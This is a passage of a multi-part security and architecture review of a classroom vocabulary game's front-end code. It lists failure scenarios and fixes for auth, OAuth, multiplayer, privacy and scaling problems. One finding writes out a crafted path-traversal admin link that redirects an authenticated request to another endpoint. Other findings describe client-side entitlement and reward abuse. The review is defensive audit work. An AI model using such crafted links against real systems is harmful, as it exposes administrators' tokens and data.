1. A student on a shared Chromebook taps Sign out while the network is flaky.
2. supabase-js returns `{ error }` and, as I understand it, keeps the local session on non-401 failures. A thrown error would leave `isSigningOut` stuck at `true`.
3. The code ignores the result and closes the menu, so the student walks away.
4. The next student on that device is in the first student's account.

**Fix:**
- Wrap the call in `try/finally`.
- Check the returned error. On failure, call `supabase.auth.signOut({ scope: 'local' })` to clear the device anyway, and show a toast.

---

### 6. Client-side path traversal in the admin teacher detail fetch (Low, trust boundary)

**Where:** `fe-next/components/admin/education/AdminTeacherDetail.tsx:70` and `:415-417`

**Failure scenario:**
1. An attacker sends the admin a link such as `/en/admin/education/teacher/..%2F..%2Fadmin%2Fteacher-access%2Fexport%3Fx=`.
2. Next decodes the route param, so `userId` contains `../`.
3. `fetchWithAuth(`/api/admin/teacher-funnel/${userId}/details`)` resolves to a different admin GET endpoint and sends the admin's Bearer token with it.

Today this is limited to GET requests, and the response is only rendered as an error. Any admin GET with side effects, or any GET that later starts reflecting data, becomes exploitable.

**Fix:**
- Validate `userId` as a UUID before fetching, and render `notFound` otherwise.
- Use `encodeURIComponent` in both the fetch and `teacherDetailPath`.

---

### 7. Admin dashboards pull whole datasets to the browser (Low-Medium, breaks at 10x)

**Where:**
- `fe-next/components/admin/overview/TeacherHealthCard.tsx:40, 21`
- `fe-next/components/admin/edu-dashboard/EduTeacherTable.tsx:18-29, 74`
- `AdminTeacherDetail.tsx:160-187, 213`

**Failure scenario:**
1. The overview card downloads the full `/api/admin/teacher-funnel` payload, every teacher row, only to show four counters. That endpoint already hits the `.in()` URL limit at a few hundred classrooms (earlier finding), so the whole admin overview fails with it.
2. `EduTeacherTable` renders every teacher row with no pagination.
3. The detail view loads every classroom, every game (with top players and missed words) and every wordlist's full word list in one service-role request.

At 10 times the current number of teachers, the admin home page is the first screen to slow down or fail.

**Fix:**
- Add a `/summary` endpoint that returns counts computed in SQL.
- Paginate the teacher table.
- Cap the detail payload, for example the last 20 games per class and the first 30 words per list, with "load more".

---

### 8. Unthrottled calendar polling on every tab focus (Low, scale)

**Where:** `fe-next/components/auth/AuthButton.tsx:92-103`

**Failure scenario:**
1. Every `visibilitychange` to visible, for every signed-in user, calls `/api/engagement/calendar`. Each call does an auth lookup and a database read.
2. A student switching tabs dozens of times per session sends dozens of calls.

API load grows with tab switches, not with users.

**Fix:**
- Skip the call if the last check was less than 5 minutes ago.
- Or compute `canClaimToday` locally from the last claim date, and refetch only when the date has changed.

---

### 9. The time-extension reward is granted on the client and can't be verified (Low, integrity; check where it is mounted)

**Where:** `fe-next/components/ads/TimeLowAdPrompt.tsx:54-57`

**Failure scenario:**
1. `onExtend(bonusSeconds)` runs locally when the ad SDK reports a reward. There is no server-side verification of the ad view.
2. If the prompt is mounted in any mode whose score reaches a server leaderboard, a modified client can call `onExtend` repeatedly.
3. That client gets unlimited time and inflated leaderboard scores.

**Fix:**
- Keep the prompt out of ranked, multiplayer and classroom modes.
- If extended games can score on leaderboards, have the server cap the game duration at base time plus one bonus, or use rewarded-ad server-side verification.

---

### 10. Russian is missing from the account-menu language switcher (Low, functional)

**Where:**
- `fe-next/components/auth/AuthButton.tsx:31-37`
- `fe-next/components/auth/AuthButtonDropdownMenu.tsx:17-23`

**Failure scenario:**
1. A user on `/ru` sees the English flag and label as their current language, because `currentLang` falls back to English.
2. If they switch to another language from the menu, there is no option to switch back to Russian.

**Fix:** Build one list from `LOCALES` in `lib/i18n` and use it in both files.

---

**Where to start:** fix #1 and #2 first. Both sit on the guest-to-account step that comes before any Teacher Pro sale, and both are small changes. Fix #4 before using signup numbers to make any pricing decision.

## Shard 9

# Security and architecture review: auth UI, Blast engine, curator inbox

This slice is mostly client code: the signup and OAuth surfaces, the Blast tile engine, the curator inbox and some classroom UI. The previous pass already reported two things in these files, so I left them out: the stale Blast score popup and the curator inbox GET sending no auth token. Everything below is new.

I read only these files. Where a finding depends on a helper I couldn't see, I say so.

---

## 1. Multiplayer Blast boards can diverge because the seeded RNG reaches only some code paths
**`fe-next/components/blast/legacy/utils/clearTilesProcessor.ts:66-67`, `144-157`, `183-187`, `379`, `472`, `475`, `487`**

**What the code intends:** the input type says `rng` is a "Seeded RNG for multiplayer determinism". Prism conversion and the mystery tile do use it (`:264`, `:271`, `:425`, `:435`, `:443`).

**What it misses:** these calls get no `rng`, so any randomness inside them uses `Math.random`:
- `executeComboEffect`
- `fireCatalystUpgrade` and `spawnGemSpecials`, which take `rollSpecialFromDistribution` as a bare function
- `earnTileUpgrade`
- every helper that receives `ctx`, because `ctx` (`:144-157`) has no rng field

**Failure scenario:**
1. Two clients start a multiplayer Blast match from the same seed.
2. A player plays any word of 5+ letters. `earnTileUpgrade` (`:475`) upgrades a standard tile to a special. Which tile and which special are almost certainly random choices.
3. Each client picks a different tile or type, so the boards now differ.
4. Every later move cascades differently: different bombs, different clears, different scores.
5. If the server or the opponent's client replays moves, or compares scores, legitimate moves look invalid and the results disagree.

This would happen after the first long word, which is the most common move in the game.

**Severity:** High if multiplayer Blast depends on lockstep simulation. Not relevant if it is single-player only. Confirm that `earnTileUpgrade`, `spawnGemSpecials` and `rollSpecialFromDistribution` actually randomise.

**Fix:**
- Add `rng` to `TileEffectContext`.
- Pass `rng` into `executeComboEffect`, `earnTileUpgrade`, `spawnGemSpecials` and `fireCatalystUpgrade`.
- Change `rollSpecialFromDistribution` to take `rng` as a parameter.
- Add a test: run `processTilesForWord` twice with the same seed and the same 5-letter path, and assert the two grids are deep-equal.

## 2. The Google button on web bypasses `useOAuthSignIn`, so its callbacks never run
**`fe-next/components/auth/shared/OAuthButtonGroup.tsx:66, 94-95`; `useOAuthSignIn.ts:17-22, 101, 120`; `MultiplayerSignupSheet.tsx:52-61`**

**What happens:** on web, when `NEXT_PUBLIC_GOOGLE_WEB_CLIENT_ID` is set, Google sign-in renders `<GoogleSignInButton>`. That button receives only `analyticsSource`, and `onSignIn` is never called. As a result, none of the hook's contract runs for the primary provider:
- `onBeforeRedirect`, which the hook documents as the place "to store pending game data"
- `onSuccess`
- `onError`
- `loadingProvider`

**Failure scenario 1: lost data**
1. A caller relies on `onBeforeRedirect` to save a pending result before redirecting.
2. A guest taps the Google button.
3. The GSI flow runs and the callback never fires, so the pending data is never saved.

**Failure scenario 2: wrong conversion metrics**
1. `MultiplayerSignupSheet` tracks `guest_conversion` in `onSuccess`.
2. `onSuccess` fires only on the native success path (`useOAuthSignIn.ts:120`). Web Google uses GSI and web Discord uses a full redirect, so neither ever returns to it.
3. Web conversions from this sheet are therefore always 0, and you may decide a working funnel is dead.

**Failure scenario 3: two flows at once**
1. A user taps Google, which never sets `loadingProvider`.
2. Discord stays enabled, so the user can start a second OAuth flow while the first is in progress.

**Severity:** Medium. The analytics problem is certain. The data-loss problem depends on whether any caller uses `onBeforeRedirect`, so grep for it.

**Fix:**
- Pass `onBeforeRedirect` into `GoogleSignInButton` and call it before the GSI flow starts.
- Track `guest_conversion` from the `signup_completed` event attributed through `latchSignupSource`, not from the `onSuccess` callback.

## 3. On iOS, a tap before native OAuth finishes initialising takes the wrong path
**`fe-next/components/auth/hooks/useOAuthSignIn.ts:74-83, 105-108, 144-165`**

**Root cause:** `initializeNativeOAuth()` runs asynchronously on mount, and its `.then` has no `.catch`. `signIn` reads `isNativeOAuthAvailable()` synchronously.

**Failure scenario:**
1. A player on iOS taps a sign-in button while initialisation is still pending.
2. `canUseNativeOAuth` is false, so the code drops to the Capacitor branch.
3. If the provider is Apple, line 160 tells an iOS user that Apple sign-in is "iOS only".
4. If the provider is Google, it falls back to the in-app browser flow instead of the native SDK.

**Related problem:** every surface that mounts this hook re-runs `initializeNativeOAuth`. That includes the inline card, the multiplayer sheet and the first-win modal. If the SDK's init isn't idempotent, concurrent inits can fail, and the failure is an unhandled rejection.

**Severity:** Medium, and iOS only. A broken Apple sign-in is also an App Review risk.

**Fix:**
- Memoise one module-level init promise.
- In `signIn`, run `await initPromise` before checking `isNativeOAuthAvailable()`.
- Add a `.catch` that marks native OAuth as unavailable.

## 4. The curator inbox invites a retry after an ambiguous failure, which can pay out twice
**`fe-next/components/curator/CuratorProposalsInbox.tsx:18-31, 61-81`**

This is a client-side trigger for the non-atomic ratify route the previous pass reported.

**Root cause:** `authedPost` reduces every outcome to `res.ok`, and the request carries no idempotency key. On any failure, the row stays in the list with the Approve button enabled, next to a generic error toast.

**Failure scenario:**
1. The admin clicks Approve.
2. The server awards coins, then times out or returns a 5xx before it updates the proposal's status.
3. The client shows an error and leaves the row actionable.
4. The admin clicks Approve again, and the curator is paid a second time.

The same happens if two admins have the inbox open, because the list is never refreshed.

**Severity:** Medium (money-adjacent).

**Fix:**
- Send `Idempotency-Key: proposal:{id}:{decision}` and have the server honour it.
- After any non-OK response, call `load()` so the row reflects server truth rather than staying actionable.
- Treat a `409 already-resolved` response as success.

## 5. Signup prompts show while auth and the CrazyGames SDK are still loading
**`fe-next/components/auth/InlineSignupCard.tsx:66, 82, 85-93`; `MultiplayerSignupSheet.tsx:49, 82`; `OAuthButtonGroup.tsx:42, 69`**

**Root cause:** the visibility check is `!isAuthenticated && !isOnCrazyGamesPlatform && gameCompleted`. It ignores both loading states. Other files in the same folder do handle them:
- `SignupToast.tsx:33,44` and `HeaderProfileEntry.tsx:21,24` check `cgLoading`. The comment in `SignupToast` names the 0–500 ms window in which sync detection misses the SDK.
- `SignupPromptHost.tsx:41-47` passes `authLoading`.

**Failure scenario 1: CrazyGames**
1. The card or sheet mounts on CrazyGames while the SDK is still resolving. This happens on a reload or deep link to a results route, or whenever SDK init hangs.
2. `OAuthButtonGroup` renders real Google and Discord buttons instead of the CrazyGames login.
3. External login inside a CrazyGames embed breaks inside the iframe, and it is the kind of thing their QA flags. That puts the channel at risk.

**Failure scenario 2: signed-in members**
1. The caller passes `isAuthenticated` while auth is still loading, so it reads as false.
2. A signed-in member sees the card flash.
3. `signup_prompt_shown` fires once for them (`:85-93`), which inflates the prompt→completed funnel you are optimising.

**Severity:** Low–medium.

**Fix:**
- Read `isLoading` from `useCrazyGames()` and accept an `authLoading` prop.
- Require both to be false before rendering anything or firing the `shown` event.
- Apply the same `cgLoading` check in `MultiplayerSignupSheet` and `OAuthButtonGroup`.

## 6. The mystery tile can turn an unprocessed tile in the player's own path into a special
**`fe-next/components/blast/legacy/utils/clearTilesProcessor.ts:429-437`, compared with `:441` and `:257`**

**Root cause:** the `spawnSpecial` neighbour filter has no `!pathSet.has(...)` check. The `miniPop` filter (`:441`) and the prism conversion (`:257`) both have it. The path is processed in order (`:200`), so a later path cell is still uncleared and still `standard` when the mystery tile is handled.

**Failure scenario:**
1. A player's word passes through a mystery tile, and the next letter in the path is adjacent to it.
2. The mystery tile rolls `spawnSpecial`, which converts that next cell into, for example, a bomb or lightning.
3. The main loop reaches that cell, and the switch at `:214` fires it as part of the same word.

The player gets a free detonation and bonus score. That inflates leaderboards and any coin rewards derived from score.

**Severity:** Low.

**Fix:** add `&& !pathSet.has(`${p.row},${p.col}`)` to the filter at `:433`.

## 7. The anti-board-wipe chain budget doesn't count magma or row-clear tiles
**`fe-next/components/blast/legacy/utils/clearTilesProcessor.ts:148-175`, `333-353`, `523-563`**

**Root cause:** the comment at `:159-168` says every clear is bounded by `chainBudget`, to prevent "blast all the board for no reason". Only combo clears go through `comboMarkCleared`. Magma's diagonal clears and the 7+ letter row-clear call raw `markCleared` and never increment `chainBudget.cleared`.

**Failure scenario:**
1. A long word crosses a magma tile, and its row contains bombs.
2. Magma clears both diagonals and queues bombs. The row-clear then clears the whole row and queues more.
3. The bomb BFS starts with `cleared` far below the real number of tiles cleared, so the half-board cap is exceeded.

This is the same full-board wipe the guard was added to stop. It also hands out unbounded `bonusScore`.

**Severity:** Low (gameplay and score integrity).

**Fix:** use `comboMarkCleared`, the budget-aware clear, in the magma loop and the row-clear loop. Or move the budget accounting inside `markCleared` itself, so no path can bypass it.

---

## What I checked and found nothing new in
- `ClassroomBossBar` and `ClassroomBossOutcome` only render numbers from the server.
- `ClassroomAddonDiscovery` and `ClassroomAddonPlanner` contain no auth or data writes. Their URLs come from builders I couldn't see.
- `ChestProgressDots`, `RankProgressBanner`, `DrillProgressionOverlay`, `MpModeCrossPromo` and `HeaderProfileEntry` look correct.
- `WinnerOnboarding` validates the name only on the client. Whether the server enforces the same 1–20 character rule is outside this slice, so check that the profile write enforces it.

**Order to fix:** #1 if multiplayer Blast is live. Then #2 and #5, because they distort the signup-conversion numbers you are using to chase first revenue. Then #4, because it touches money.

## Shard 10

# Review: classroom launch, results and lobby components (findings the previous pass missed)

Scope is the files in this batch: the lobby, express launch, controller, runner, mode banner, leaderboard and results card. I have already removed anything the previous pass reported:

- the abandon-path socket leak
- duplicate lessons on retry
- `connect_error` failing a launch that could succeed
- the leaderboard's client-side visibility filter
- server-side `setex` overwrites
- spoofing the handshake `authUserId`

Several findings below depend on server code I could not see. Those are marked **verify**. They are ordered by severity.

---

## 1. Every student's phone receives every classmate's mastery and standings. "Hide leaderboard" only hides them on screen.
**`components/education/ClassroomResultsCard.tsx:12-14, 67, 74, 184, 191, 239`** · **High (minors' data, broken privacy setting)**

**What happens**
1. The card renders from "the server-built `classroomSummary` in the **shared** results payload" (lines 12-14). That is one payload for the whole room.
2. That payload contains `masteryByPlayer`, which is per-student mastery for the entire class. The teacher-only `ClassNeedsHelp` (line 239) uses it to show "which children to pull aside".
3. A student's phone reads just one entry, `summary.masteryByPlayer[username]` (line 184). But the whole map, plus `podium` and the full `standings`, has already arrived on that phone.
4. A teacher turns on hide-placings, so `hideClassPlacings` is set (lines 74, 186, 191). This only skips rendering. Opening devtools or a websocket inspector on any student phone still shows the ranked scores and who is struggling.

**Why it matters**
- These are minors.
- The previous pass's leaderboard finding was about the REST hook. This is the socket results broadcast, so it is a separate leak.
- Trust from schools and districts depends on the hide setting actually hiding data.

**Fix**
- Build the results payload per recipient on the server:
  - **Teacher:** the full summary.
  - **Student:** their own mastery, plus podium and standings only when placings are not hidden.
- Emit to each socket individually, not as a room broadcast.

## 2. Player identity is the display name, so name collisions mix up students' results
**`ClassroomResultsCard.tsx:119-123, 142, 155-156, 184`** · **Medium-high (data integrity)**

**What happens**
1. Guests choose their own display name, and the join flow asks for nothing else.
2. Two students both join as "Noa".
3. The card picks your own row with `username.trim().toLowerCase()` (line 122). It picks the winner the same way (line 156), and looks up mastery with `masteryByPlayer[username]` (line 184).
4. As a result:
   - Both phones show "YOU WON".
   - Both see the same mastery entry. On the server that map is keyed by name, so one Noa's results probably overwrite the other's.
   - `useSessionRoundHistory` banks the first Noa's score for both of them.
5. The teacher is filtered out by name (`standingsWithoutHost(standings, summary.teacherName)`, line 119; `podiumWithoutHost`, line 142). A student who joins under the teacher's display name disappears from the podium. A student who picks a classmate's name gets that classmate's mastery shown on their own phone.

**Fix**
- Key standings, podium and `masteryByPlayer` by a server-issued player id: the auth uid, which guests also have, or the seat id.
- Have the server tell each socket its own id. Use name strings only for display.
- Mark the host with a flag, not a name match.
- Optionally reject duplicate names at join.

## 3. The client chooses the room code, and that breaks at scale and on retry
**`ClassroomGameLobbyExpress.tsx:66-71, 122`; `ClassroomGameLobby.tsx:107, 282, 416`** · **Medium now, high at 10x**

**Scenario A: two classes get the same code by chance**
1. `randomGameCode()` builds a 6-character code with `Math.random()` over 32 characters, about 1.07e9 possible codes, entirely in the browser.
2. The server writes the room with `setex` and no `NX`. The previous pass flagged this, but only as an attack.
3. With N rooms live at once (rooms last 4 hours in Redis) and L launches a day, you can expect about `L·N/1.07e9` collisions per day. At 10k live rooms and 50k launches a day, that is roughly one collision every two days.
4. In a collision, a second teacher silently takes over a live room, and that room's players are wiped.

**Scenario B: retrying replaces your own room**
1. In the full lobby, the error Retry button (line 416) calls `startGame` with the same `gameCode` from the hook.
2. Suppose the first create reached Redis but its acknowledgement was lost. Retry then re-creates the room under the same code, with `players: []`.
3. Students who already joined are dropped.
4. **Verify** whether `useClassroomLaunchSocket` issues a new code on failure.

**Fix**
- Have the server issue the code: `SET … NX`, retried on collision, and return it in the ack.
- Have the client send an idempotency key (`launchKey`) so a retry returns the existing room instead of replacing it.

## 4. A successful express launch leaves its socket connected for the rest of the tab's life
**`ClassroomGameLobbyExpressController.ts:99-103, 128-141`; `ClassroomGameLobbyExpress.tsx:135-138, 304-315`** · **Medium (resource leak, grows with usage)**

**What happens**
1. On success, `succeed()` marks the launch settled and publishes the game code. It never runs the disposers.
2. Disposers only run inside `abandonLaunch`. That is called on Retry, on a mode switch and on Full setup, but not on success and not on unmount.
3. The comment at line 305 says it runs "on the way out", but nothing calls it then.
4. `router.replace` (line 314) navigates client-side. The launch socket, which the server joined to `classroom:<id>` and probably to the game room, stays connected until a full page reload.
5. A teacher who keeps one tab open and runs six classes a day ends up with six zombie sockets subscribed to room broadcasts. Each one is extra server fan-out.
6. **Verify:** if the server's host-presence or reclaim logic is tied to the socket that created the room, that socket never disconnects. The server's view of whether the teacher is present then diverges from reality.

**Fix**
- In `succeed`, run the disposers after publishing the snapshot: disconnect, then delete from `launches`. The host page opens its own socket anyway.
- Remove settled launches from the module-level `launches` map so it does not grow without bound.

## 5. A paying teacher's pressure settings are silently dropped while Pro status loads, and the Pro gate is client-side only
**`ClassroomGameLobby.tsx:139-140, 307-310, 454`** · **Medium (paid feature lost; possible entitlement bypass)**

**What happens**
1. `useTeacherPro()` returns `hasPro: false` until it resolves.
2. The pressure dials (line 454) render and can be changed regardless of Pro status.
3. A Pro teacher sets the dials and taps GO LIVE quickly. `...(hasTeacherPro ? { pressure } : {})` sends nothing, so the room opens with the loud defaults and no message is shown.
4. In the other direction, the gate is just this one spread in the client. A free teacher can emit `updateClassroomPressure` (or include `pressure`) directly.
5. The previous pass found that `classroomPressureHandler.ts:64` checks `teacherId`. It did not report any entitlement check there.
6. `classroomBossId` (line 296) is also sent with no Pro check. The server's `bossEntitlement` falling back to the free boss covers that case, so it is lower risk.

**Fix**
- Disable GO LIVE, or at least the dials, while Pro status is loading.
- Enforce Pro in the pressure handler on the server, using the same entitlement resolver as `bossEntitlement`.

## 6. Per-IP rate limiting conflicts with school networks
**`ClassroomModeBanner.tsx:162-166`; `ClassroomGameLobbyExpress.tsx:189`** · **Medium now, high at 10x (verify the server keys)**

**What happens**
1. The banner's own comment says the `/api/education/classroom/live-game` lookup "fails per IP, which a whole class shares". In practice, students' phones fall back to showing reduced information.
2. At 10x, one school or a district proxy puts hundreds of students and dozens of teachers behind one public IP.
3. If socket rate limits are also keyed by IP (`rateLimited`, line 189), teachers in the same building opening rooms at the bell get `RATE_LIMITED`. The express screen turns that into a launch failure in front of the class.

**Fix**
- Key rate limits on the authenticated uid (guests have one too) or on the socket or session.
- Keep a high per-IP cap only as an abuse backstop.
- Give room metadata reads a cache with a separate, higher budget.

## 7. Mixing lessons in different languages creates a game in the first lesson's language
**`ClassroomGameLobby.tsx:189, 197, 250, 289`** · **Medium (data integrity)**

**What happens**
1. The teacher selects an English lesson and a Hebrew lesson.
2. `allPlayableWords` merges the words from every selected lesson (line 189).
3. The game language is `selectedLessons[0]?.language` (lines 197 and 289), so it depends on which lesson is first.
4. The board is generated for one language. The other lesson's words can never be placed. The quiz focus scan (lines 203-206) also checks only one language.
5. Results then show those words as "missed" or "never placed". The class appears to have failed words that could never appear on the board.

**Fix**
- Limit multi-select to lessons in the same language, or disable lessons in other languages after the first pick.
- Alternatively, fail with a clear `blockedKey` when the selected lessons' languages differ.

## 8. Lesson payload size is not bounded anywhere on the client
**`ClassroomGameLobbyExpressRunner.ts:172-174, 202-204`; `ClassroomGameLobby.tsx:239-240`; `ClassroomGameLobbyExpress.tsx:274`** · **Low-medium now, real at 10x (verify the server cap)**

**What happens**
1. A pasted list goes straight into `createLesson` with no limit on word count or word length.
2. Every unique word then goes into `createClassroomGame`. The only cap is `applyVocabularyCap(allPlayableWords, presetCap)`, and it does nothing when there is no preset (`presetCap = 0`).
3. The words are stored in the Redis game record.
4. The previous pass found that `getActiveClassroomGames` sends the whole record to every classroom member.
5. So one 20k-word paste becomes a large jsonb row, a large Redis value, and a large payload sent to every student, on every active-games poll.

**Fix**
- Cap the list size in the server schemas for lessons and for `createClassroomGame`. For example, 200 words of at most 40 characters each.
- Show the cap in the paste UI.

## 9. The lobby can redirect a signed-in teacher away before auth has loaded
**`ClassroomGameLobby.tsx:176-178`** · **Low-medium (funnel; verify the parent gate)**

**What happens**
1. `useEffect(() => { if (!user) router.push('/education') })` runs whenever `user` is null. On a hard load, deep link or refresh, that is the case before the session has loaded.
2. The deep-link entry points named in the props are `?cefr=` (the ESL page's demo CTA), `?mode=` and `?minutes=` (onboarding).
3. If nothing above this component waits for auth to load, a signed-in teacher arriving from the marketing CTA is sent back to the education hub.

**Fix**
- Gate on the auth context's loading flag: `if (!authLoading && !user)`.
- Or rely on the `TeacherGate` wrapper and remove this effect.

## 10. Lesson play counts come from an unverified client call
**`ClassroomGameLobbyExpress.tsx:177`** · **Low (verify)**

**What happens**
1. After the room is confirmed, `recordLessonPlays(startedLessonIds)` runs in the browser with lesson ids the client chose.
2. If it is a client-callable insert or RPC, anyone can call it in a loop with any lesson id.
3. If play counts feed Discover or library ranking, that ranking can be inflated.

**Fix**
- Record plays on the server inside `createClassroomGame`. At that point the room exists, the teacher is verified, and the lesson ids can be checked against lessons the teacher can access.
- Remove the client call.

---

**Checked and not flagged:**
- The `useSyncExternalStore` snapshot handling in the controller.
- The `ClassroomGuestDemo` code sanitisation.
- The mode catalogue, preview and spotlight components. They are presentational.
- The honesty strips. They are marketing copy with static links.

## Shard 11

# Senior review: what the previous pass missed

**Scope.** I read only the 34 files included in this batch: the education components, the economy and boss UI, the live-control strip and the checkout CTAs. These files don't contain server handlers, RLS policies or the `/teacher` layout. Where a finding depends on code I couldn't see, I say what to check.

**Already reported, not repeated:**
- The `PracticeSessionProvider` retry-ref bug.
- The `TeacherCheckEmail` resend with no `try/catch`.
- The `XpProgressBar` import from the backend module.
- The boss picker's server-side Pro check.

I found 8 issues. Two of them (#1, #2) depend on code outside these files, so check those first.

---

## 1. The "Start Teacher Pro" buttons may lead to a teacher-access approval queue instead of checkout
**Severity:** High if confirmed. This is the revenue path.

**Where:**
- `TeacherProCheckoutCta.tsx:26,142,163`
- `TeacherProCompareCheckoutStrip.tsx:15,104`
- `TeacherAccessCTA.tsx:70`
- `ProFramingSection.tsx:99`
- `ClassroomBossPicker.tsx:36`
- The gate: `TeacherGate.tsx:52-53,79-85`

**Failure scenario:**
1. A teacher arrives from search, signed out or signed in without the teacher role, and clicks the main money CTA: "Start Teacher Pro — $9/mo".
2. Every one of these CTAs links to `/{locale}/teacher/upgrade`.
3. `TeacherGate`'s own header says it is "the single role gate for every /teacher surface". If the upgrade page renders inside that gate, `!isLoading && !hasAccess` fires `router.replace('/…/education/access?from=…')`.
4. The rest of the repo shows that teacher access goes through an admin approval queue:
   - `teacher-access/[id]/approve`
   - `TeacherAccessQueue`
   - the "approved-but-not-promoted" comments in `useTeacherAccess`
5. The buyer is therefore asked to apply for access, at the moment they tried to pay. Unless you approve them, you never get the $9.

**How to check:** Open `/en/teacher/upgrade` in a private window, and with a fresh non-teacher account. If you land on `/education/access`, this bug is real.

**Fix:**
- Move the upgrade and checkout page outside the `TeacherGate` layout, for example `/[locale]/pro/upgrade`.
- Gate it only on "signed in", and send anonymous visitors to sign-in with `from=` set.
- Paying should grant teacher access. Approval should not be a step before checkout.

## 2. A teacher who reconnects during a paused round can lose the Resume button, leaving the class frozen
**Severity:** Medium-high. It stops a live class. It depends on how the server replies (see below).

**Where:**
- `controls/useTeacherStripState.ts:63-64,81-83`
- `controls/teacherStripVisibility.ts:74-77`

**Failure scenario:**
1. A board round (classic or word-hunt) is running, and the teacher presses Pause.
2. The projector laptop's Wi-Fi drops briefly and the socket reconnects. The `connect` handler fires `askForQuiz()`, which emits `vocabQuiz:requestState`.
3. This is a board room, not a quiz, so the server either replies with an empty or null snapshot or doesn't reply at all.
4. If it replies, `onQuizSnapshot` maps a missing phase to `'ended'` (`payload?.phase ?? 'ended'`). The reducer then returns `IDLE_ROUND_STATE` (`:75-76`), which clears `boardRound` as well as the quiz flags.
5. `isRoundLive` becomes false, so `shouldShowTeacherStrip` becomes false and the strip unmounts.
6. Normally the `timeUpdate` self-heal (`:60-63`) would bring it back. While paused, the clock doesn't tick, so nothing restores the strip.
7. The strip is the only Resume control. `TeacherLiveControls.tsx:150` says it sits above `GamePausedOverlay` "so Resume is always reachable". The whole class stays on the pause overlay until the teacher reloads, and maybe even then.

The same wipe can also happen on first mount: if the `askForQuiz` reply lands just after `startGame`, the strip flickers off for up to one second.

**Fix:**
- In the `quizSnapshot` case, an "ended" or empty snapshot should clear only the quiz flags: `{ ...state, quizRound: false, quizPaused: false }`.
- Treat a missing `phase` as "no quiz", not as `'ended'`.
- Keep `quizEnded` returning IDLE, since that event really does end both.
- Add a reducer test for "board running, then empty quiz snapshot, then strip stays visible".

## 3. Practice-session completion uses cookie-only auth and no `keepalive`, so XP is lost on stale sessions and closed tabs
**Severity:** Medium. Server-side XP is lost permanently. This is a different root cause from the retry-ref bug the previous pass reported.

**Where:** `PracticeSessionProvider.tsx:234-238`, and the guard at `:220-221`.

**Failure scenario A (auth):**
1. The PATCH is a bare `fetch` with no `Authorization` header, so it relies on the cookie.
2. The repo itself notes that "cookie session can be stale" while the browser client has refreshed (`ownedClassroomRoute.ts:21`, quoted in the previous pass). Shard 21 found the same problem in Blast.
3. A student on a long practice run hits an expired cookie, and the request returns 401.
4. The session id is already in `completedSessionIdsRef`, so the request is never retried. `completed_at` and the XP are never written.
5. The UI still shows the client-side estimate from `:201`.

**Failure scenario B (tab close):**
1. A student finishes a round and immediately closes the Chromebook lid or the tab, which is common at the bell.
2. The PATCH is only sent after `await awardPracticeXp(...)` (`:194`), and it is not `keepalive`.
3. The browser aborts the request, so the server never sees the completion.

**Fix:**
- Send the PATCH through the same `fetchWithAuth` (Bearer) helper the rest of the app uses, with `keepalive: true`.
- Send it first, before `awardPracticeXp`.
- Delete the session id from the ref on any non-2xx response or exception.

## 4. The economy snapshot poll never stops, and every student and teacher emits `requestState` on each connect
**Severity:** Medium. This will hurt at 10x.

**Where:**
- `economy/useClassroomEconomy.ts:52-60`
- `economy/ClassroomEconomyDock.tsx:27` plus `economy/ClassroomRoundReward.tsx:16`, which run two instances of the hook
- `controls/useTeacherStripState.ts:81-83`

**Failure scenario:**
1. The retry effect re-arms every 2 s for as long as `snapshot` is null.
2. `onError` (`:30`) sets `error` but never sets `snapshot`. So whenever the server rejects the request, for example because economy is off for the room, the game has ended, or the student isn't in the room, the client emits `requestState` every 2 s for the life of the page.
3. The dock and the results reward each run their own copy of the hook, so a student can poll twice.
4. At 50 students per room across many concurrent classes, these rejected students produce a steady stream of `requestState` events, and the server takes a Redis lock or read on each one.
5. On a server restart or deploy, every socket reconnects at once. Each one also fires `vocabQuiz:requestState` from `useTeacherStripState` (`:82`). That listener is installed regardless of `isHost`, so if the shared multiplayer shell mounts it for students too, every phone sends it.

**Fix:**
- Stop retrying on an `E.error` reply.
- Cap retries, for example 5 attempts with exponential backoff and jitter.
- Lift the economy state into one provider per game, so both the dock and the reward screen read it.
- Only install the quiz-state request when `isHost && isClassroomMode`.
- Add jitter before reconnect-time state requests.

## 5. Leaderboard and roster identify players by display name, so duplicate names cross wires
**Severity:** Medium if the server allows duplicate names in a room. Classes often have two students called "Noa" or "Alex", especially guests.

**Where:**
- `duels/LiveClassroomLeaderboard.tsx:94-99,157-158,165,170-172,232,299`
- `lobby/ClassroomWaitingStage.tsx:74,226-231`

**Failure scenario:**
1. Two guest students both join as "Alex".
2. On the phone strip, `rows.findIndex(r => r.username === me)` picks the first "Alex". Student B sees A's score as "me", with the wrong neighbours.
3. `ups[currentPlayer]` plays B's "you scored" sting whenever A scores.
4. On the projector, `id: r.username` gives `LeaderboardRowReorder` duplicate React keys. Rows merge, jump or disappear, and the score-pop map (keyed by name) attributes "+N" to the wrong row.
5. In the waiting room, `others = classmates.filter(c => c.username !== username)` hides every classmate who shares your name. The duplicate `key` also breaks the avatar list.

**Fix:**
- Carry a stable `userId` or `playerId` in the leaderboard and roster payloads, and key and match on it.
- If the server already enforces unique names per room, document that invariant next to `LiveBoardEntry`, and this becomes a non-issue.

## 6. `TeacherGate` can show the previous teacher's dashboard to the next user on a shared laptop
**Severity:** Medium-low. Real protection depends on the API and RLS, but the UI can leak whatever is cached client-side.

**Where:** `TeacherGate.tsx:44,110-119,129-131`

**Failure scenario:**
1. Teacher A uses `/teacher/...`. The module-scoped `grantedTeacherIds` holds A, and `lastKnownUser.id` is A.
2. A signs out from a page that doesn't render `TeacherGate`, through client-side navigation with no full reload.
3. The clear in `:110-113` only runs inside a `TeacherGate` render, so `lastKnownUser.id` stays A.
4. A student signs in on the same tab and is sent to a `/teacher/...` URL, for example through the browser back button or a saved link.
5. While auth initialises, `userId` is null and `isLoading` is true. `effectiveUserId` falls back to A, `wasGranted` is true, and the gate renders the children (`:129-131`).
6. Any client stores or SWR caches still holding A's classrooms or roster render for the new user. The redirect effect is held off because `isLoading` is true.

**Fix:**
- Clear `grantedTeacherIds` and `lastKnownUser` from the auth provider's `SIGNED_OUT` handler, not from `TeacherGate`'s render.
- Also reset the teacher data stores on sign-out.
- Confirm that every `/api/teacher/*` and classroom query checks ownership on the server.

## 7. `useAuthedLessons` keeps the previous student's lessons across an account switch
**Severity:** Low-medium. It is a privacy issue on shared classroom devices.

**Where:** `academyModes/useAuthedLessons.ts:23,27-28,35,39-40`

**Failure scenario:**
1. Student A loads their lessons.
2. A signs out and student B signs in on the same tab. `ready` goes false, then true again.
3. `lessons` is never reset, so A's lesson list stays on screen until B's fetch resolves.
